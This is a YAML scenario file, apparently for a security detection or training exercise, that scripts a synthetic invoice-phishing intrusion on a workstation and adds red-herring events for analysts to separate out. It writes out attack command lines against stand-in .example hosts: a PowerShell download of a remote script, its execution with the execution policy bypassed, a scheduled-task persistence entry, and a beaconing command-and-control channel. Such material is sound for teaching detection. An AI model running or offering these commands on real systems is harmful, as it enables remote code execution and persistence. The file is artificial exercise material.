storyline:
- id: invoice-delivery
  time: +1h
  actor: nina.torres
  system: CVA-WS-01
  activity: A supplier-themed message arrives in Nina's mailbox.
  events:
  - type: email_message
    sender: billing@harbor-invoices.example
    to:
    - nina.torres@cedarvale.example
    corpus_id: invoice-review
    artifact_id: cva-invoice-1048
    verdict: phishing
    technique: T1566.002
- id: mailbox-access
  time: +1h12m
  actor: nina.torres
  system: CVA-WS-01
  activity: Nina opens her mailbox over encrypted IMAP.
  events:
  - type: logon
    logon_type: 2
    description: User-session context preceding the lure interaction.
  - type: email_read
    server: primary
    protocol: imaps
    message_ids:
    - cva-invoice-1048
    count: 3
    duration: 43.0
- id: portal-open
  time: +1h15m
  actor: nina.torres
  system: CVA-WS-01
  activity: A browser opens the supplier-themed document page.
  events:
  - type: process
    process_name: C:\Program Files\Google\Chrome\Application\chrome.exe
    command_line: '"C:\Program Files\Google\Chrome\Application\chrome.exe" http://documents.harbor-invoices.example/review/november'
    process_ref: invoice-browser
  - type: connection
    dst_ip: 198.51.100.61
    dst_port: 80
    service: http
    hostname: documents.harbor-invoices.example
    method: GET
    uri: /review/november
    status_code: 200
    response_body_len: 4620
- id: helper-download
  time: +1h17m
  actor: nina.torres
  system: CVA-WS-01
  activity: A PowerShell download saves the offered reconciliation script.
  events:
  - type: process
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri http://documents.harbor-invoices.example/assets/statement-viewer.ps1
      -OutFile C:\Users\nina.torres\Downloads\statement-viewer.ps1"
    process_ref: helper-download
  - type: connection
    dst_ip: 198.51.100.61
    dst_port: 80
    service: http
    hostname: documents.harbor-invoices.example
    method: GET
    uri: /assets/statement-viewer.ps1
    status_code: 200
    response_body_len: 7168
- id: helper-execution
  time: +1h20m
  actor: nina.torres
  system: CVA-WS-01
  activity: Nina runs the offered script, establishing the user-context foothold.
  events:
  - type: process
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\nina.torres\Downloads\statement-viewer.ps1
    process_ref: viewer-agent
- id: scheduled-persistence
  time: +1h23m
  actor: nina.torres
  system: CVA-WS-01
  activity: The script registers a per-user logon task to rerun itself.
  events:
  - type: process
    process_name: C:\Windows\System32\schtasks.exe
    command_line: schtasks.exe /Create /TN "LedgerUpdateCheck" /SC ONLOGON /TR "powershell.exe -NoProfile
      -File C:\Users\nina.torres\Downloads\statement-viewer.ps1" /F
    parent_ref: viewer-agent
- id: tasking-worker
  time: +1h25m
  actor: nina.torres
  system: CVA-WS-01
  activity: The bootstrap script starts its polling worker after task registration.
  events:
  - type: process
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -NoProfile -File C:\Users\nina.torres\Downloads\statement-viewer.ps1
      -Mode Poll
    parent_ref: viewer-agent
    process_ref: tasking-worker
- id: json-tasking
  time: +1h26m
  actor: nina.torres
  system: CVA-WS-01
  activity: The foothold polls a JSON tasking endpoint with variable intervals.
  events:
  - type: beacon
    dst_ip: 198.51.100.62
    dst_port: 80
    hostname: api.ledger-status.example
    service: http
    profile: json_tasking
    interval: 95s
    duration: 48m
    jitter: 0.28
- id: invoice-follow-up
  time: +2h30m
  actor: nina.torres
  system: CVA-WS-01
  activity: The sender follows up on the earlier invoice message.
  events:
  - type: email_message
    sender: billing@harbor-invoices.example
    to:
    - nina.torres@cedarvale.example
    corpus_id: phish-reminder
    artifact_id: cva-invoice-reminder
    verdict: phishing
red_herrings:
- id: inventory-task
  time: +3h
  actor: caleb.stone
  system: CVA-WS-06
  activity: IT runs its ordinary inventory task.
  events:
  - type: process
    process_name: C:\Windows\System32\schtasks.exe
    command_line: schtasks.exe /Run /TN "DeviceInventory"
  explanation: Approved inventory work on the IT workstation; distinguish its host, operator and task
    name from the invoice chain.
- id: ordinary-supplier-mail
  time: +45m
  actor: evan.brooks
  system: CVA-WS-02
  activity: An ordinary supplier receipt reaches another mailbox.
  events:
  - type: email_message
    sender: accounts@harbor-supply.example
    to:
    - evan.brooks@cedarvale.example
    corpus_id: supplier-receipt
    artifact_id: cva-receipt-benign
  explanation: A legitimate supplier message has a similarly themed subject but different sender identity,
    recipient and receipt content.
scenario_version: 1.0.0
configuration_context: ../configuration/context.yaml
